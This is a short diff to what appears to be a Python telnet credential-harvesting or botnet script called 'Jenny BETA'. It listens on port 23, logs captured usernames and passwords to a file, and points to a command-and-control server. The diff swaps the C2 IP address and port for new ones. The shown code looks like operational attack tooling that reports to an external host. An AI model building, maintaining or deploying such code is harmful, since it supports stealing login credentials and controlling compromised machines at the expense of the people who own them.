@@ -12,8 +12,8 @@ s.bind(('',23))
 s.listen(10)
 s.settimeout(10)
 
-C2 = "128.199.197.11"
-C2PORT = 9898
+C2 = "45.55.18.16"
+C2PORT = 8989
 
 print "[+]-------Jenny BETA-------[+]"
 
@@ -84,3 +84,4 @@ def fileLogger(usr, pw):
         f.write(usr + " " + pw + "\n")
 
 '''
+
